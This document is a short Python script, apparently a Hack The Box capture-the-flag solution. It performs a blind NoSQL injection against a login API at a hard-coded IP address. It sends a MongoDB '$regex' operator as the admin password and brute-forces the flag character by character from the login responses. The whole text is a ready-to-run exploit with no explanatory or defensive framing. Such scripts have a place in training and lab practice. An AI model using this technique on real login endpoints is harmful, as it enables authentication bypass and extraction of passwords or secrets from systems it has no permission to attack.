import requests, string
req = requests.session()
arr = string.digits + string.ascii_letters + "_@{}-/()!\"$%=^[]:;"

def blind(flag):
    for char in arr:
        res = req.post('http://157.245.32.64:31878/api/login',json={'username':'admin','password':{"$regex": "^"+flag+char}}).text
        if '"logged":1' in res:
            return char
    return None        

def flag():
    flag = 'HTB{'
    while True:
        c = blind(flag)
        if c == '}' or c == None:
            return flag + c
        flag += c 
        print('[+] flag = ',flag)

print('[+] flag = ',flag())
